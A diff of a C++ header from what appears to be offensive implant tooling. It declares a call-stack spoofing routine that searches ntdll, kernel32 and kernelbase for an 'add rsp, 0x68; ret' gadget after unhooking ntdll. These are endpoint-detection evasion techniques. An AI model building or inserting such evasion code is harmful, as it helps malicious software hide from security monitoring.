@@ -56,9 +56,11 @@ static_assert(offsetof(SpoofContext, StackArgs)     ==  48, "SpoofContext layout
 static_assert(offsetof(SpoofContext, StackArgCount) == 112, "SpoofContext layout");
 static_assert(sizeof(SpoofContext)                  == 120, "SpoofContext layout");
 
-// One-time init. Searches ntdll, kernel32, kernelbase for `add rsp, 0x68; ret`.
-// Call after UnhookNtdll(). Returns FALSE if no gadget found; SpoofCall will
-// forward the call directly (no stack spoofing, but still functional).
+// One-time init. Searches the operator-configured module list
+// (CONFIG_CALLSTACK_SPOOF_MODULES in config.hpp — defaults to
+// ntdll/kernel32/kernelbase) for `add rsp, 0x68; ret`. Call after
+// UnhookNtdll(). Returns FALSE if no gadget found; SpoofCall will forward
+// the call directly (no stack spoofing, but still functional).
 BOOL InitCallstackSpoof();
 
 // Returns the cached gadget address (NULL before InitCallstackSpoof succeeds).
